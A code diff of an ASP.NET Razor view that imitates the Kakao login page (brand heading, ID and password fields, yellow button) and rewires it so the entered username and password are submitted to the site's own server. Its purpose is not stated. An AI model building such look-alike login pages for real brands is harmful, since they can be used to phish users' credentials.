@@ -12,43 +12,40 @@
 </head>
 <body>
     <div>
-        <table align="center">
-            <tr>
-                <td>
-                    <h1 style="text-align: center; padding-top: 45px; font-family: 'Malgun Gothic'">kakao</h1>
-                    
-                    <table align="center" style="width:390px">
-                        <tr>
-                            <td style="width:380px">
-                                <input type="text"
-                                       placeholder="KakaoMailID, email, phone number"
-                                       name="uname"
-                                       required 
-                                       style="width: 378px; height: 35px; border: none !important"/>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td style="width:380px; padding-top:10px; padding-bottom:20px">
-                                <input type="password" placeholder="Password" name="psw" required style="width: 378px; height: 35px; border: none !important"/>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td >
-                                <button type="button" class="btn-primary" onclick="location.href='LoginKakao'" style="width: 400px; height: 55px !important; background-color: #f7df07 !important; border: none !important">
-                                    <table align="left" width="390px">
-                                        <tr>
-                                            <td align="center">
-                                                <h4 style="text-align: center; font-family:'Malgun Gothic">Login</h4>
-                                            </td>
-                                        </tr>
-                                    </table>
-                                </button>
-                            </td>
-                        </tr>
-                    </table>
-                </td>
-            </tr>
-        </table>
+        @using (Html.BeginForm())
+        {
+            <table align="center">
+                <tr>
+                    <td>
+                        <h1 style="text-align: center; padding-top: 45px; font-family: 'Malgun Gothic'">kakao</h1>
+
+                        <table align="center" style="width:390px">
+                            <tr>
+                                <td style="width:380px">
+                                    <input type="text"
+                                           placeholder="KakaoMailID, email, phone number"
+                                           name="uname"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="width:380px; padding-top:10px; padding-bottom:20px">
+                                    <input type="password" placeholder="Password" name="psw" required style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <input type="submit" value="Login" style="width: 380px; height: 55px !important;
+                                                                              background-color: #f7df07 !important; 
+                                                                              border: none !important; font-weight:bold"/>
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        }
     </div>
 </body>
 </html>
